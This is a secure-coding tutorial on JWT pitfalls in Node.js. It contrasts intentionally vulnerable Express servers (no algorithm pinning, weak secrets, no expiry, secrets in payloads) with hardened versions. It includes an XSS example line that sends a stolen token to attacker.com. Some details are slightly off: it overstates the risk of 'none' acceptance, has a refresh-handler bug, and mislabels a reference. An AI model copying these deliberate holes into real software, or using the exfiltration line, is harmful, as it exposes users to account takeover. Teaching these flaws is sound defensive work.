# JWT Security in JavaScript/Node.js

## Definition

JSON Web Tokens (JWTs) are a popular method for stateless authentication and authorization. However, JWTs have numerous security pitfalls: algorithm confusion attacks, weak secrets, missing expiry, no revocation mechanism, storing sensitive data in plaintext, and improper storage. Understanding JWT security is critical for building secure applications.

## JWT Structure

A JWT consists of three base64url-encoded parts separated by dots:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Header.Payload.Signature
```

### Header Component

Contains metadata about the token:

```json
{
  "alg": "HS256",  // Signing algorithm
  "typ": "JWT"     // Token type
}
```

### Payload Component

Contains the claims (statements about the subject):

```json
{
  "sub": "1234567890",  // Subject (user ID)
  "name": "John Doe",   // User name
  "iat": 1516239022,    // Issued at (timestamp)
  "exp": 1516242622,    // Expiry time
  "email": "john@example.com"
}
```

**Standard Claims:**
- `iss` - Issuer
- `sub` - Subject
- `aud` - Audience
- `exp` - Expiration time
- `nbf` - Not before
- `iat` - Issued at
- `jti` - JWT ID

### Signature Component

Cryptographic signature ensuring the token hasn't been tampered with:

```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```

## Algorithm Confusion Attack

Algorithm confusion occurs when the server doesn't properly validate the algorithm field, allowing an attacker to change it to an insecure algorithm.

### Attack Vector 1: HS256 to "none"

```javascript
// Original token payload
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "sub": "user123",
  "role": "user"
}

// Attacker changes algorithm to "none"
{
  "alg": "none",  // Changed!
  "typ": "JWT"
}
{
  "sub": "user123",
  "role": "admin"  // Changed to admin!
}

// Signature is empty (no algorithm means no signature)
// If server doesn't check algorithm, this token is accepted!
```

### VULNERABLE Code: No Algorithm Verification

```javascript
const jwt = require('jsonwebtoken');
const express = require('express');
const app = express();

const SECRET = 'my-secret-key';

app.use(express.json());

// VULNERABLE: Doesn't verify algorithm
app.post('/vulnerable/login', (req, res) => {
  const user = { id: 123, email: 'user@example.com', role: 'user' };

  // Sign with HS256 (default)
  const token = jwt.sign(user, SECRET);

  res.json({ token });
});

// VULNERABLE: Accepts any algorithm including "none"
app.get('/vulnerable/profile', (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');

  try {
    // VULNERABLE: No algorithm check
    const decoded = jwt.verify(token, SECRET); // Accepts "none"!

    if (decoded.role === 'admin') {
      res.json({ message: 'Admin panel', admin: true });
    } else {
      res.json({ message: 'User panel' });
    }
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
});

app.listen(3000);

// Attack:
// 1. Attacker creates fake token with alg: "none" and role: "admin"
// 2. Server accepts it because it doesn't check algorithm
// 3. Attacker gains admin access
```

### Attack Vector 2: RS256 to HS256

Switching from asymmetric (RS256) to symmetric (HS256) algorithm:

```javascript
// VULNERABLE: Uses RS256 (public key verify) but accepts HS256
const express = require('express');
const jwt = require('jsonwebtoken');
const fs = require('fs');

const app = express();

// Public key for RS256 verification
const publicKey = fs.readFileSync('public.pem');

// VULNERABLE: Doesn't restrict algorithm
app.get('/vulnerable/api', (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');

  try {
    // VULNERABLE: Accepts both RS256 and HS256
    const decoded = jwt.verify(token, publicKey);
    res.json({ decoded });
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
});

app.listen(3000);

// Attack:
// 1. Server uses RS256 with public key for verification
// 2. Attacker signs token with HS256 using the public key as secret
// 3. HS256 verifies using: HMAC(public_key_content)
// 4. Since public key is known, attacker can sign tokens!
// 5. Server verifies with public key, which matches the HS256 signature
```

## Weak Secrets

Short or easily guessable secrets allow attackers to forge tokens:

```javascript
// VULNERABLE: Weak secret
const SECRET = 'secret'; // Only 6 characters, easy to brute force
const token = jwt.sign(user, SECRET);

// VULNERABLE: Default secret
const SECRET = 'default-secret-key'; // Too simple

// SECURE: Strong secret from environment
const SECRET = process.env.JWT_SECRET; // Should be 32+ random characters
```

## Missing Expiry (exp Claim)

JWTs without expiry remain valid indefinitely:

```javascript
// VULNERABLE: No expiry
const token = jwt.sign(user, SECRET);
// Token is valid forever!

// SECURE: With expiry
const token = jwt.sign(
  user,
  SECRET,
  { expiresIn: '15m' } // Expires in 15 minutes
);
```

## No Token Revocation / Blacklisting Problem

JWTs are stateless but this means invalidated tokens remain valid (e.g., after logout, password change):

```javascript
// Problem: After logout, old token is still valid
app.post('/logout', (req, res) => {
  // Just tell client to discard token
  // But the token remains valid on the server!
  res.json({ success: true });
});

// Solution 1: Token blacklist
const tokenBlacklist = new Set();

app.post('/logout', (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');

  // Add token to blacklist
  tokenBlacklist.add(token);

  res.json({ success: true });
});

// Check blacklist on every request
app.get('/protected', (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');

  if (tokenBlacklist.has(token)) {
    return res.status(401).json({ error: 'Token revoked' });
  }

  // Continue with JWT verification
});

// Solution 2: Session-based revocation
// Store JTI (JWT ID) in database for active tokens
const activeTokens = new Map();

app.post('/login', (req, res) => {
  const user = authenticateUser(email, password);

  const jti = crypto.randomUUID();

  const token = jwt.sign(
    { id: user.id, jti },
    SECRET,
    { expiresIn: '15m' }
  );

  // Store active token
  activeTokens.set(jti, { userId: user.id, expiresAt: Date.now() + 15 * 60 * 1000 });

  res.json({ token });
});

app.post('/logout', (req, res) => {
  const decoded = jwt.decode(req.headers.authorization?.replace('Bearer ', ''));

  // Remove from active tokens
  activeTokens.delete(decoded.jti);

  res.json({ success: true });
});

// Verify token is still active
app.get('/protected', (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  const decoded = jwt.verify(token, SECRET);

  if (!activeTokens.has(decoded.jti)) {
    return res.status(401).json({ error: 'Token revoked' });
  }

  res.json({ data: 'Protected data' });
});
```

## Sensitive Data in Payload

JWTs are base64url-encoded, NOT encrypted. Sensitive data is visible to anyone with the token:

```javascript
// VULNERABLE: Storing sensitive data in JWT
const token = jwt.sign({
  id: user.id,
  email: user.email,
  role: user.role,
  password: user.password,        // EXPOSED!
  creditCard: user.creditCard,    // EXPOSED!
  ssn: user.ssn,                  // EXPOSED!
  apiKey: user.apiKey             // EXPOSED!
}, SECRET);

// Anyone can decode this and see the sensitive data:
const payload = jwt.decode(token);
// {
//   id: 123,
//   email: "user@example.com",
//   password: "super_secret_password",  // EXPOSED!
//   creditCard: "4532 1234 5678 9999",  // EXPOSED!
//   ssn: "123-45-6789"                  // EXPOSED!
// }

// SECURE: Only store necessary identifiers
const token = jwt.sign({
  id: user.id,
  email: user.email,
  role: user.role
  // Don't include: password, credit card, SSN, API keys
}, SECRET, { expiresIn: '15m' });

// Sensitive data should be retrieved from database on each request
app.get('/api/user-details', authenticateToken, (req, res) => {
  const user = getUserFromDB(req.user.id); // Fetch from DB
  res.json(user); // Send sensitive data in HTTPS response only
});
```

## Storing JWTs: localStorage vs HttpOnly Cookie

### localStorage (Vulnerable to XSS)

```javascript
// Store JWT in localStorage
localStorage.setItem('token', jwtToken);

// Use in requests
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('token')}`
  }
});

// VULNERABILITY: Accessible to JavaScript
// Malicious script can steal token:
const stolenToken = localStorage.getItem('token');
fetch('https://attacker.com/steal?token=' + stolenToken);
```

### HttpOnly Cookie (Protected from XSS)

```javascript
// Server sets HttpOnly cookie
res.cookie('authToken', jwtToken, {
  httpOnly: true,        // Inaccessible to JavaScript
  secure: true,          // HTTPS only
  sameSite: 'strict',    // CSRF protection
  maxAge: 15 * 60 * 1000 // 15 minutes
});

// Browser automatically includes cookie in requests
// Cannot be stolen by JavaScript

// Malicious script cannot access:
// const token = document.cookie; // Won't have authToken
```

## Vulnerable JWT Code Examples

### 1. Algorithm Confusion

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');

const app = express();
const SECRET = 'weak-secret';

// VULNERABLE: Doesn't validate algorithm
app.get('/vulnerable/api', (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');

  try {
    // Problem 1: No algorithm specification (accepts any)
    const decoded = jwt.verify(token, SECRET);

    res.json({ decoded });
  } catch (err) {
    res.status(401).json({ error: err.message });
  }
});

// Attack token (none algorithm):
// Header: {"alg":"none","typ":"JWT"}
// Payload: {"role":"admin","id":123}
// Signature: (empty)

app.listen(3000);
```

### 2. No Expiry Check

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');

const app = express();
const SECRET = 'secret-key';

app.post('/vulnerable/login', (req, res) => {
  const user = { id: 123, email: 'user@example.com' };

  // VULNERABLE: No expiry specified
  const token = jwt.sign(user, SECRET);
  // Token is valid forever!

  res.json({ token });
});

app.get('/vulnerable/protected', (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');

  try {
    // VULNERABLE: No expiry check
    const decoded = jwt.verify(token, SECRET);
    res.json({ message: 'Accessed protected resource' });
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
});

app.listen(3000);

// Attack: Use same token for years without re-authentication
```

### 3. Sensitive Data in Payload

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');

const app = express();
const SECRET = 'secret-key';

app.post('/vulnerable/login', (req, res) => {
  const user = {
    id: 123,
    email: 'user@example.com',
    password: 'super_secret_password',  // VULNERABLE!
    creditCard: '4532-1234-5678-9999',  // VULNERABLE!
    apiKey: 'sk-1234567890abcdef'      // VULNERABLE!
  };

  const token = jwt.sign(user, SECRET, { expiresIn: '1h' });
  res.json({ token });
});

// Attack: Decode token and see all sensitive data
const payload = jwt.decode(token);
console.log(payload.password); // Exposed!
console.log(payload.creditCard); // Exposed!
console.log(payload.apiKey); // Exposed!
```

### 4. Weak Secret

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');

const app = express();

// VULNERABLE: Weak secret (only 6 characters)
const SECRET = 'secret';

app.post('/vulnerable/login', (req, res) => {
  const token = jwt.sign({ id: 123 }, SECRET);
  res.json({ token });
});

// Attack: Brute force the secret
// Try all common words and short strings
// Once found, attacker can forge any token
```

## Secure JWT Implementation

### 1. Proper JWT Signing and Verification

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

const app = express();
app.use(express.json());

// Use strong secret from environment
const JWT_SECRET = process.env.JWT_SECRET || crypto.randomBytes(32).toString('hex');
const JWT_EXPIRY = '15m';
const REFRESH_TOKEN_EXPIRY = '7d';

// Login endpoint - create tokens
app.post('/secure/login', async (req, res) => {
  const { email, password } = req.body;

  // Authenticate user
  const user = await authenticateUser(email, password);
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Create access token (short-lived)
  const accessToken = jwt.sign(
    {
      id: user.id,
      email: user.email,
      role: user.role
    },
    JWT_SECRET,
    {
      algorithm: 'HS256',  // Explicitly set algorithm
      expiresIn: JWT_EXPIRY,
      issuer: 'myapp',
      audience: 'myapp-users'
    }
  );

  // Create refresh token (longer-lived)
  const refreshTokenJti = crypto.randomUUID();
  const refreshToken = jwt.sign(
    {
      id: user.id,
      jti: refreshTokenJti
    },
    process.env.REFRESH_TOKEN_SECRET,
    {
      algorithm: 'HS256',
      expiresIn: REFRESH_TOKEN_EXPIRY,
      issuer: 'myapp'
    }
  );

  // Save refresh token JTI in database
  saveRefreshToken(user.id, refreshTokenJti);

  // Set tokens in HttpOnly cookies
  res.cookie('accessToken', accessToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000 // 15 minutes
  });

  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
  });

  res.json({ success: true });
});

// Verify token middleware
function verifyAccessToken(req, res, next) {
  const token = req.cookies.accessToken;

  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  try {
    // SECURE: Specify algorithm and strict verification
    const decoded = jwt.verify(token, JWT_SECRET, {
      algorithms: ['HS256'],
      issuer: 'myapp',
      audience: 'myapp-users'
    });

    req.user = decoded;
    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired', code: 'TOKEN_EXPIRED' });
    }
    res.status(401).json({ error: 'Invalid token' });
  }
}

// Protected endpoint
app.get('/secure/protected', verifyAccessToken, (req, res) => {
  res.json({ message: `Hello ${req.user.email}` });
});

// Refresh token endpoint
app.post('/secure/refresh-token', (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }

  try {
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET, {
      algorithms: ['HS256'],
      issuer: 'myapp'
    });

    // Check if JTI is still valid (not revoked)
    if (!isRefreshTokenValid(decoded.id, decoded.jti)) {
      return res.status(401).json({ error: 'Refresh token revoked' });
    }

    // Generate new access token
    const newAccessToken = jwt.sign(
      { id: decoded.id, email: decoded.email, role: decoded.role },
      JWT_SECRET,
      { algorithm: 'HS256', expiresIn: JWT_EXPIRY }
    );

    res.cookie('accessToken', newAccessToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000
    });

    res.json({ success: true });
  } catch (error) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});

// Logout endpoint
app.post('/secure/logout', verifyAccessToken, (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (refreshToken) {
    const decoded = jwt.decode(refreshToken);
    revokeRefreshToken(req.user.id, decoded.jti);
  }

  res.clearCookie('accessToken');
  res.clearCookie('refreshToken');

  res.json({ success: true });
});

app.listen(3000);
```

## Best Practices for JWT Security

1. **Always specify algorithm** - Use `algorithms: ['HS256']` in verify
2. **Use strong secrets** - 32+ random characters, from environment variables
3. **Set expiry time** - Keep access tokens short-lived (15-60 minutes)
4. **Use refresh tokens** - Longer-lived tokens for getting new access tokens
5. **Store in HttpOnly cookies** - Protect from XSS attacks
6. **Include issuer and audience** - `iss` and `aud` claims for validation
7. **Use HTTPS only** - Prevent man-in-the-middle attacks
8. **No sensitive data** - Only include identifiers, not passwords or tokens
9. **Implement revocation** - Use JWT blacklist or JTI-based revocation
10. **Sign at login time** - Don't let clients create their own tokens
11. **Validate signature** - Always verify signature on every request
12. **Use appropriate algorithm** - HS256 for symmetric, RS256 for asymmetric

## Complete Secure JWT Example

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');

const app = express();
app.use(express.json());
app.use(cookieParser());

// Secrets from environment
const ACCESS_TOKEN_SECRET = process.env.ACCESS_TOKEN_SECRET;
const REFRESH_TOKEN_SECRET = process.env.REFRESH_TOKEN_SECRET;

// Token blacklist for revocation
const tokenBlacklist = new Set();

// Login
app.post('/login', (req, res) => {
  const user = { id: 123, email: 'user@example.com', role: 'user' };

  const accessToken = jwt.sign(user, ACCESS_TOKEN_SECRET, {
    algorithm: 'HS256',
    expiresIn: '15m'
  });

  const refreshToken = jwt.sign({ id: user.id }, REFRESH_TOKEN_SECRET, {
    algorithm: 'HS256',
    expiresIn: '7d'
  });

  res.cookie('accessToken', accessToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000
  });

  res.json({ success: true });
});

// Verify middleware
function verifyToken(req, res, next) {
  const token = req.cookies.accessToken;

  if (tokenBlacklist.has(token)) {
    return res.status(401).json({ error: 'Token revoked' });
  }

  try {
    const decoded = jwt.verify(token, ACCESS_TOKEN_SECRET, {
      algorithms: ['HS256']
    });
    req.user = decoded;
    next();
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
}

// Protected route
app.get('/protected', verifyToken, (req, res) => {
  res.json({ message: 'Protected data', user: req.user });
});

// Logout
app.post('/logout', verifyToken, (req, res) => {
  tokenBlacklist.add(req.cookies.accessToken);
  res.clearCookie('accessToken');
  res.json({ success: true });
});

app.listen(3000);
```

## References

- JWT Introduction: https://jwt.io/
- JWT Security Best Practices: https://tools.ietf.org/html/rfc7519
- CWE-295: Improper Certificate Validation: https://cwe.mitre.org/data/definitions/295.html
- Algorithm Confusion: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
- OWASP JWT Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
